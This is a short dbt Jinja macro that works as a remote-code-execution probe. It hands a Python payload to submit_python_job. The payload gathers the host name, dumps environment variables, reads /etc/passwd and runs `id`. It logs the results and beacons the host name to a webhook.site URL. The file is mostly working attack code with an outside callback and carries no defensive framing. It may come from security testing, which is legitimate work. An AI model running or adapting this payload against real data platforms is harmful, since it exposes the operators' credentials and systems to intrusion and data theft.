{% macro py_exec() %}
  {{ log("PHASE=start", info=True) }}
  
  {# Try calling submit_python_job with Python code #}
  {% set py_code %}
import os
import socket
hostname = socket.gethostname()
env_dump = str(dict(os.environ))[:2000]
print(f"RCE_HOSTNAME={hostname}")
print(f"RCE_ENV={env_dump}")
try:
    with open('/etc/passwd') as f:
        print(f"RCE_PASSWD={f.read()[:500]}")
except Exception as e:
    print(f"RCE_PASSWD_ERROR={e}")
try:
    import subprocess
    out = subprocess.check_output(['id'], text=True)
    print(f"RCE_ID={out.strip()}")
except Exception as e:
    print(f"RCE_ID_ERROR={e}")
try:
    import urllib.request
    urllib.request.urlopen(f'https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72?rce=confirmed&host={hostname}', timeout=5)
except:
    pass
  {% endset %}
  
  {{ log("PY_CODE_READY=true", info=True) }}
  
  {# Try different ways to call submit_python_job #}
  {% set result = submit_python_job(py_code) %}
  {{ log("PY_EXEC_RESULT=" ~ result, info=True) }}
  
{% endmacro %}
